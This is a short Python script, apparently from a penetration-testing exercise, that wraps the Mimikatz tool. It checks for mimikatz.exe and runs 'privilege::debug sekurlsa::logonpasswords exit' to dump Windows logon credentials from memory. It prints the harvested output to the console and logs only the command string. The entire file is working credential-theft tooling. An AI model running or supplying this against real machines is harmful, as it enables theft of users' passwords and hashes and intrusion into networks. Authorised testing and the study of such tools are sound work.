import os
import subprocess

# Task 2: Function to check if Mimikatz exists
def check_mimikatz_path(mimikatz_path):
    """Check if the Mimikatz executable exists at the specified path."""
    if os.path.exists(mimikatz_path):
        return True
    else:
        return False

# Task 3: Set Up the Execution Environment
def run_mimikatz_command(mimikatz_path, command):
    """Execute a Mimikatz command and return the output."""
    try:
        process = subprocess.run(
            [mimikatz_path, command],
            capture_output=True,
            text=True
        )
        return process.stdout
    except Exception as e:
        print(f"Error running Mimikatz: {e}")
        return None

# Task 5: Implement Logging for Auditing
def log_execution(details):
    """Log script execution for auditing purposes."""
    with open("mimikatz_log.txt", "a") as log_file:
        log_file.write(details + "\n")

# Task 4 & 5: Modified Main Function
def main():
    # Update this path to the actual location of mimikatz.exe on your system
    mimikatz_path = "C:\\Path\\To\\Mimikatz\\mimikatz.exe" 

    if check_mimikatz_path(mimikatz_path):
        mimikatz_command = "privilege::debug sekurlsa::logonpasswords exit"
        print(f"Executing Mimikatz command: {mimikatz_command}")

        # Logging the execution detail before showing output
        log_execution(f"Executed command: {mimikatz_command}")

        output = run_mimikatz_command(mimikatz_path, mimikatz_command)
        
        if output:
            print("Mimikatz Output:")
            print(output)
            # Note: We are printing to console for the tester, 
            # but NOT writing the 'output' variable to the log file 
            # to prevent storing plaintext credentials in the log.
        else:
            print("Failed to execute Mimikatz or no output returned.")
    else:
        print(f"[-] Mimikatz not found at {mimikatz_path}. Please verify the path.")

if __name__ == "__main__":
    main()